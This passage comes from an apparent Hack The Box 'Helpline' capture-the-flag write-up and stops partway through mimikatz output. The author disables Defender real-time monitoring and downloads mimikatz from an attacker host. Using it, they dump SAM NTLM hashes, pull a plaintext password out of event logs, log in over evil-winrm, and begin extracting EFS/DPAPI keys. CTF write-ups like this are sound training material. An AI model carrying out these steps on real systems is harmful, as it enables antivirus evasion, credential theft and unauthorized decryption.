<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;cipher &#x2F;c root.txt</span><br><span class="line">cipher &#x2F;c root.txt</span><br><span class="line"></span><br><span class="line"> Listing C:\Users\Administrator\Desktop\</span><br><span class="line"> New files added to this directory will not be encrypted.</span><br><span class="line"></span><br><span class="line">E root.txt</span><br><span class="line">  Compatibility Level:</span><br><span class="line">    Windows XP&#x2F;Server 2003</span><br><span class="line"></span><br><span class="line">  Users who can decrypt:</span><br><span class="line">    HELPLINE\Administrator [Administrator(Administrator@HELPLINE)]</span><br><span class="line">    Certificate thumbprint: FB15 4575 993A 250F E826 DBAC 79EF 26C2 11CB 77B3</span><br><span class="line"></span><br><span class="line">  No recovery certificate found.</span><br><span class="line"></span><br><span class="line">  Key information cannot be retrieved.</span><br><span class="line"></span><br><span class="line">The specified file could not be decrypted.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;cipher &#x2F;c ..&#x2F;..&#x2F;tolu&#x2F;Desktop&#x2F;user.txt</span><br><span class="line">cipher &#x2F;c ..&#x2F;..&#x2F;tolu&#x2F;Desktop&#x2F;user.txt</span><br><span class="line"></span><br><span class="line"> Listing C:\Users\tolu\Desktop\</span><br><span class="line"> New files added to this directory will not be encrypted.</span><br><span class="line"></span><br><span class="line">E user.txt</span><br><span class="line">  Compatibility Level:</span><br><span class="line">    Windows XP&#x2F;Server 2003</span><br><span class="line"></span><br><span class="line">  Users who can decrypt:</span><br><span class="line">    HELPLINE\tolu [tolu(tolu@HELPLINE)]</span><br><span class="line">    Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29 </span><br><span class="line"></span><br><span class="line">  No recovery certificate found.</span><br><span class="line"></span><br><span class="line">  Key information cannot be retrieved.</span><br><span class="line"></span><br><span class="line">The specified file could not be decrypted.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>
<p>To decrypt them we need <code>Administrator</code>‘s password for <code>root.txt</code> and <code>tolu</code>‘s password for <code>user.txt</code>. First time I solved this box I got the root flag first as it was easier but for the write-up I’ll do user flag first.</p>
<h2 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h2><p>Since we need passwords, first thing I did was to put <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener"><code>mimikatz</code></a> on the box and dump the password hashes.<br>But before that I had to disable :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop&gt; Set-MpPreference -DisableRealtimeMonitoring $true</span><br><span class="line">Set-MpPreference -DisableRealtimeMonitoring $true</span><br><span class="line">PS C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PS C:\windows\system32\spool\drivers\color&gt; Invoke-WebRequest http:&#x2F;&#x2F;10.10.xx.xx&#x2F;mimikatz.exe -OutFile mimikatz.exe</span><br><span class="line">Invoke-WebRequest http:&#x2F;&#x2F;10.10.xx.xx&#x2F;mimikatz.exe -OutFile mimikatz.exe</span><br><span class="line">PS C:\windows\system32\spool\drivers\color&gt; dir</span><br><span class="line">dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\windows\system32\spool\drivers\color</span><br><span class="line">    </span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        9&#x2F;15&#x2F;2018   8:12 AM           1058 D50.camp</span><br><span class="line">-a----        9&#x2F;15&#x2F;2018   8:12 AM           1079 D65.camp</span><br><span class="line">-a----        9&#x2F;15&#x2F;2018   8:12 AM            797 Graphics.gmmp</span><br><span class="line">-a----        9&#x2F;15&#x2F;2018   8:12 AM            838 MediaSim.gmmp</span><br><span class="line">-a----        8&#x2F;16&#x2F;2019   1:24 PM        1006744 mimikatz.exe</span><br><span class="line">-a----        8&#x2F;16&#x2F;2019   1:47 PM          38616 nc.exe</span><br><span class="line">-a----        9&#x2F;15&#x2F;2018   8:12 AM            786 Photo.gmmp</span><br><span class="line">-a----        9&#x2F;15&#x2F;2018   8:12 AM            822 Proofing.gmmp</span><br><span class="line">-a----        9&#x2F;15&#x2F;2018   8:12 AM         218103 RSWOP.icm</span><br><span class="line">-a----        9&#x2F;15&#x2F;2018   8:12 AM           3144 sRGB Color Space Profile.icm</span><br><span class="line">-a----        9&#x2F;15&#x2F;2018   8:12 AM          17155 wscRGB.cdmp</span><br><span class="line">-a----        9&#x2F;15&#x2F;2018   8:12 AM           1578 wsRGB.cdmp</span><br><span class="line"></span><br><span class="line">PS C:\windows\system32\spool\drivers\color&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::sam</span><br><span class="line">Domain : HELPLINE</span><br><span class="line">SysKey : f684313986dcdab719c2950661809893</span><br><span class="line">Local SID : S-1-5-21-3107372852-1132949149-763516304</span><br><span class="line"></span><br><span class="line">SAMKey : 9db624e549009762ee47528b9aa6ed34</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: d5312b245d641b3fae0d07493a022622</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000001f7 (503)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : 000001f8 (504)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: 52a344a6229f7bfa074d3052023f0b41</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : alice</span><br><span class="line">  Hash NTLM: 998a9de69e883618e987080249d20253</span><br><span class="line"></span><br><span class="line">RID  : 000003ef (1007)</span><br><span class="line">User : zachary</span><br><span class="line">  Hash NTLM: eef285f4c800bcd1ae1e84c371eeb282</span><br><span class="line"></span><br><span class="line">RID  : 000003f1 (1009)</span><br><span class="line">User : leo</span><br><span class="line">  Hash NTLM: 60b05a66232e2eb067b973c889b615dd</span><br><span class="line"></span><br><span class="line">RID  : 000003f2 (1010)</span><br><span class="line">User : niels</span><br><span class="line">  Hash NTLM: 35a9de42e66dcdd5d512a796d03aef50</span><br><span class="line"></span><br><span class="line">RID  : 000003f3 (1011)</span><br><span class="line">User : tolu</span><br><span class="line">  Hash NTLM: 03e2ec7aa7e82e479be07ecd34f1603b</span><br></pre></td></tr></table></figure>
<p>The only crackable hash was <code>zachary</code>‘s :<br><img src="/images/hackthebox/helpline/23.png" alt=""><br>But what can we do with <code>zachary</code> ?</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PS C:\windows\system32\spool\drivers\color&gt; net users zachary</span><br><span class="line">net users zachary</span><br><span class="line">User name                    zachary</span><br><span class="line">Full Name                    zachary</span><br><span class="line">Comment</span><br><span class="line">User&#39;s comment</span><br><span class="line">Country&#x2F;region code          000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            12&#x2F;21&#x2F;2018 10:25:34 PM</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          12&#x2F;21&#x2F;2018 10:25:34 PM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     No</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   8&#x2F;16&#x2F;2019 1:37:32 PM</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Event Log Readers    *Users</span><br><span class="line">Global Group memberships     *None</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
<p><code>zachary</code> is a member of a local group called <code>Event Log Readers</code>, maybe there is something in the event log, I queried the event log with <code>wevtutil</code> and saved the output in a file :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\spool\drivers\color&gt;wevtutil qe security &#x2F;rd:true &#x2F;f:text &#x2F;r:helpline &#x2F;u:HELPLINE\zachary &#x2F;p:0987654321 &gt; eventlog.txt                                                                        </span><br><span class="line">wevtutil qe security &#x2F;rd:true &#x2F;f:text &#x2F;r:helpline &#x2F;u:HELPLINE\zachary &#x2F;p:0987654321 &gt; eventlog.txt</span><br><span class="line"></span><br><span class="line">C:\Windows\System32\spool\drivers\color&gt;</span><br></pre></td></tr></table></figure>
<p>The output was a very long one so I searched for interesting stuff like usernames, by searching  for <code>tolu</code> I got this <code>net use</code> command which had <code>tolu&#39;s</code> password :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\spool\drivers\color&gt;type eventlog.txt | findstr tolu                                                                   </span><br><span class="line">type eventlog.txt | findstr tolu                                                                                                           </span><br><span class="line">        Account Name:           tolu                                                                                                       </span><br><span class="line">        Account Name:           tolu                                                                                                       </span><br><span class="line">        Account Name:           tolu                                                                                                       </span><br><span class="line">        Account Name:           tolu                                                                                                       </span><br><span class="line">        Account Name:           tolu                                                                                                       </span><br><span class="line">        Account Name:           tolu                                                                                                       </span><br><span class="line">        Account Name:           tolu                                                                                                       </span><br><span class="line">        Account Name:           tolu                                                                                                       </span><br><span class="line">        Account Name:           tolu                                                                                                       </span><br><span class="line">        Account Name:           tolu                                                                                   </span><br><span class="line">        Account Name:           tolu                                                                                   </span><br><span class="line">        Account Name:           tolu                                                                                   </span><br><span class="line">        Account Name:           tolu</span><br><span class="line">    ----------------</span><br><span class="line">     Removed Output</span><br><span class="line">    ----------------</span><br><span class="line">Process Command Line:   &quot;C:\Windows\system32\systeminfo.exe&quot; &#x2F;S \\helpline &#x2F;U &#x2F;USER:tolu &#x2F;P !zaq1234567890pl!99                                                                                           </span><br><span class="line">        Account Name:           tolu</span><br><span class="line">Logon Account:  tolu</span><br><span class="line">        Account Name:           tolu</span><br><span class="line">        Process Command Line:   &quot;C:\Windows\system32\net.exe&quot; use T: \\helpline\helpdesk_stats &#x2F;USER:tolu !zaq1234567890pl!99                                                                                     </span><br><span class="line">        Account Name:           tolu</span><br><span class="line">        Account Name:           tolu</span><br></pre></td></tr></table></figure>
<p><code>tolu : !zaq1234567890pl!99</code><br><code>tolu</code> is in the <code>Remote Management Users</code> local group :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\spool\drivers\color&gt;net users tolu</span><br><span class="line">net users tolu</span><br><span class="line">User name                    tolu</span><br><span class="line">Full Name                    tolu</span><br><span class="line">Comment                      </span><br><span class="line">User&#39;s comment               </span><br><span class="line">Country&#x2F;region code          000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            12&#x2F;28&#x2F;2018 10:52:52 PM</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          12&#x2F;28&#x2F;2018 10:52:52 PM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     No</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                 </span><br><span class="line">User profile                 </span><br><span class="line">Home directory               </span><br><span class="line">Last logon                   12&#x2F;29&#x2F;2018 10:20:44 PM</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Remote Management Use*Users                </span><br><span class="line">Global Group memberships     *None                 </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
<p>And <code>winrm</code>‘s port is open :<br><img src="/images/hackthebox/helpline/24.png" alt=""><br>So I thought of authenticating as <code>tolu</code> to read the flag (I used <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener"><code>evilwinrm</code></a>)<br><img src="/images/hackthebox/helpline/25.png" alt=""><br>But I still couldn’t read the flag …</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\tolu\Desktop&gt; type user.txt</span><br><span class="line">Access to the path &#39;C:\Users\tolu\Desktop\user.txt&#39; is denied.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ type user.txt</span><br><span class="line">+ ~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : PermissionDenied: (C:\Users\tolu\Desktop\user.txt:String) [Get-Content], UnauthorizedAccessException</span><br><span class="line">    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand</span><br></pre></td></tr></table></figure>
<p>I found this <a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" target="_blank" rel="noopener">guide</a> to decrypt <code>EFS</code> files with <code>mimikatz</code>, by following it I was able to decrypt the user flag.<br>We need to get the certificate and decrypt the master/private keys (details in the guide mentioned above) :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::system &#x2F;file:&quot;C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29&quot; &#x2F;export                                                                               </span><br><span class="line">* File: &#39;C:\Users\tolu\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\91EF5D08D1F7C60AA0E4CEE73E050639A6692F29&#39;                                                                                      </span><br><span class="line">[0045&#x2F;1] BACKED_UP_PROP_ID                                                                     00                                                                                         [0002&#x2F;1] KEY_PROV_INFO_PROP_ID                                                                 Provider info:                                                                                     Key Container  : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d                                       Provider       : Microsoft Enhanced Cryptographic Provider v1.0                             Provider type  : RSA_FULL (1)                                                               Type           : AT_KEYEXCHANGE (0x00000001)                                                 Flags          : 00000000                                                                   Param (todo)   : 00000000 &#x2F; 00000000                                                 [0003&#x2F;1] SHA1_HASH_PROP_ID</span><br><span class="line">  91ef5d08d1f7c60aa0e4cee73e050639a6692f29</span><br><span class="line">[0020&#x2F;1] cert_file_element</span><br><span class="line">  Data:</span><br><span class="line">308202f9308201e1a0030201020210560e4d2b13840a9f4ef8246c32c1950f300d06092a864886f70d0101050500300f310d300b06035504031304746f6c753020170d3138313232393231323133335a180f32313138313230353231323133335a300f310d3</span><br><span class="line">00b06035504031304746f6c7530820122300d06092a864886f70d01010105000382010f003082010a0282010100b661bbc3191aed3031d754ceee0cef50462a746656b973a74bed822fa31d44b8eb9ce1f165ef9f9691863b18694d0d72ddbb4ed40bc91021ef9ec7dc</span><br><span class="line">977242dbab9d9124e548d7f71bfa191de5d0fd1d23de24a10958c5821adb7b89b350e5c3da17cdffdf828659dd8732f55bc7bd4f7e7c167f3f054520c34a4b280dbe0e86faae45082eeed8422549a49134b398351563c62dab70cfa3bb66d9cf07e749f3c2bc9a554a8</span><br><span class="line">b2bcda9559d3f42b7b1fed755c519f26243756363efd93cae3f71aa813af0757d231a43daae5b3dc4303b330833e2db7cad6af45ab9c2b756c2de5af4f250df1c58e35bdfb3ccbc6c3be0db973faf27314413375d7b1c40dbc3310203010001a34f304d30150603551d</span><br><span class="line">25040e300c060a2b0601040182370a030430290603551d1104223020a01e060a2b060104018237140203a0100c0e746f6c754048454c504c494e450030090603551d1304023000300d06092a864886f70d010105050003820101001054e49d105efb13f699ec26dd8f2</span><br><span class="line">828eff46966b8b3623dafb132b287e4a4c870261bb6bec2acf8a8a648aead2b8c9daeb366d6096889ea23cba08d71b78aa9c09e92218c6bbd5b17e67910c551f0f452963d730f5b90c6be10048c1234087bcd1cdcc0f17adae55452f7f0b495414f54de59ff39f513e8</span><br><span class="line">1aae5c1aa6e54beb8561aa5795cb59dddbfe528b9020d1f4d1aab1842eafbc0c0d92c75aa42ab1dd278262676a2fd5a39b526544d37cf59c2647db5efb743c78fb744be0cf41b2512c7f42dbb2949cbe359aca36b17670247b49b12c27119f7d358ca38e70c3ccebd13</span><br><span class="line">c5bccc7236ae09646af07077233b49a5615cb8be05b642e09de595c89dfb9</span><br><span class="line">  Saved to file: 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz # dpapi::capi &#x2F;in:&quot;C:\Users\tolu\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-1011\307da0c2172e73b4af3e45a97ef0755b_86f90bf3-9d4c-47b0-bc79-380521b14c85&quot;</span><br><span class="line"></span><br><span class="line">**KEY (capi)**</span><br><span class="line"></span><br><span class="line">  dwVersion          : 00000002 - 2</span><br><span class="line">  dwUniqueNameLen    : 00000025 - 37</span><br><span class="line">  dwSiPublicKeyLen   : 00000000 - 0</span><br><span class="line">  dwSiPrivateKeyLen  : 00000000 - 0</span><br><span class="line">  dwExPublicKeyLen   : 0000011c - 284</span><br><span class="line">  dwExPrivateKeyLen  : 00000650 - 1616</span><br><span class="line">  dwHashLen          : 00000014 - 20</span><br><span class="line">  dwSiExportFlagLen  : 00000000 - 0</span><br><span class="line">  dwExExportFlagLen  : 000000fc - 252</span><br><span class="line">  pUniqueName        : e65e6804-f9cd-4a35-b3c9-c3a72a162e4d</span><br><span class="line">  pHash              : 0000000000000000000000000000000000000000</span><br><span class="line">  pSiPublicKey       :</span><br><span class="line">  pSiPrivateKey      :</span><br><span class="line">  pSiExportFlag      :</span><br><span class="line">  pExPublicKey       : 525341310801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef63637543</span><br><span class="line">62f219c555d7feb1b7423f9d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e</span><br><span class="line">51d19fa1bf7d748e524919dabdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b60000000000000000                                         </span><br><span class="line">  pExPrivateKey      :</span><br><span class="line">  **BLOB**</span><br><span class="line">    dwVersion          : 00000001 - 1</span><br><span class="line">    guidProvider       : &#123;df9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;</span><br><span class="line">    dwMasterKeyVersion : 00000001 - 1</span><br><span class="line">    guidMasterKey      : &#123;2f452fc5-c6d2-4706-a4f7-1cd6b891c017&#125;</span><br><span class="line">    dwFlags            : 00000000 - 0 ()</span><br><span class="line">    dwDescriptionLen   : 0000002c - 44</span><br><span class="line">    szDescription      : CryptoAPI Private Key</span><br><span class="line">    algCrypt           : 00006610 - 26128 (CALG_AES_256)</span><br><span class="line">    dwAlgCryptLen      : 00000100 - 256</span><br><span class="line">    dwSaltLen          : 00000020 - 32</span><br><span class="line">    pbSalt             : d05086dc4a0e8c37b26b9298d6e507a07e6b01495c8e874636d6555909860bfc</span><br><span class="line">    dwHmacKeyLen       : 00000000 - 0</span><br><span class="line">    pbHmackKey         :</span><br><span class="line">    algHash            : 0000800e - 32782 (CALG_SHA_512)</span><br><span class="line">    dwAlgHashLen       : 00000200 - 512</span><br><span class="line">    dwHmac2KeyLen      : 00000020 - 32</span><br><span class="line">    pbHmack2Key        : b7a581f4205455a35c32cf2bae9d3be3fd90990ae6f63c417e9c5a06084d04f1</span><br><span class="line">    dwDataLen          : 00000550 - 1360</span><br><span class="line">    pbData             : 